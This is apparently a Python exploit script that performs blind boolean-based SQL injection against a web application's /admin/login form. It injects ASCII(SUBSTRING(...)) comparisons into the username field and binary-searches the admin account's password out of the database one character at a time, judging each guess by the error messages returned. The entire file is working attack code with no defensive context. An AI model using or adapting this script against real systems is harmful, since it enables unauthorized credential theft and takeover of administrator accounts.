import requests
import argparse
import urllib.parse
import requests, re

parser = argparse.ArgumentParser()
parser = argparse.ArgumentParser()

parser.add_argument("-u", "--url",
                    dest="url",
                    action='store', required=True)
parser.add_argument("--dbg",  action=argparse.BooleanOptionalAction, default=False)

args = parser.parse_args()
url = args.url
dbg = args.dbg
#sql = args.sql

login_url = f"{url}/admin/login"

headers = { "Content-Type": "application/x-www-form-urlencoded",
			"Origin": f"{url}",
			"Referer": f"{url}/admin/index.php"}


def get_payload(letter_number, compare_ch ,snumber):
	return f'OR ASCII(SUBSTRING((SELECT password FROM admin WHERE username = "admin" LIMIT 1 OFFSET 0), {letter_number}, 1)) {compare_ch} {snumber}'


def check(payload):

	data = { 'username': f'\' {payload}#', 'password': 'asd', 'login': ''}

	encoded_data = urllib.parse.urlencode(data)

	proxy = { 'http': 'http://127.0.0.1:8080' }
	s = requests.Session()
	s.get(login_url)

	r = s.post(login_url,data=encoded_data, proxies=proxy, headers=headers)

	if ("Cannot find" in r.text):
		return False

	if ("Incorrect" in r.text):
		return True


def rev_compare_ch(word):
    if (word == '<'):
        return '>'
    if (word == '>'):
        return '<'

    raise NotImplemented


def get_password():
    password = ""
    letter_number = 1
    while(1):
        new_letter = word_brute(letter_number,password)
        if (new_letter == None):
            print(password)
            break;
        password += str(new_letter)
        letter_number += 1


def word_brute(letter_number,password):
    with open("dbg.txt", "a") as f:
        max_number = 128
        prev_snumber = 128
        snumber = 64
        compare_ch = '<'
        payload = get_payload(letter_number, compare_ch ,snumber)
        iter = 1
        stop = False
        while (1):
            if (check(payload)):
                stop = False

                print(f'{password}{chr(snumber)}', end='\r')

                temp = snumber
                if (compare_ch == '<'):
                    snumber = snumber - int(abs((prev_snumber - snumber) / 2))
                else:
                    snumber = snumber + int(abs((prev_snumber - snumber) / 2))

                prev_snumber = temp

                if(dbg):
                    f.write(str(f"{snumber} "))
            else:
                if (stop):
                    if (int(snumber) != 64):
                        print(f'{password}{chr(snumber)}', end='\r')
                        f.write(str(f"{snumber}\n"))
                        return chr(snumber)
                    else:
                        return None

                compare_ch = rev_compare_ch(compare_ch)
                max_number = prev_snumber
                stop = True

            payload = get_payload(letter_number, compare_ch ,snumber)
            iter = iter + 1
            if (iter > 14):
                return None
                break


get_password()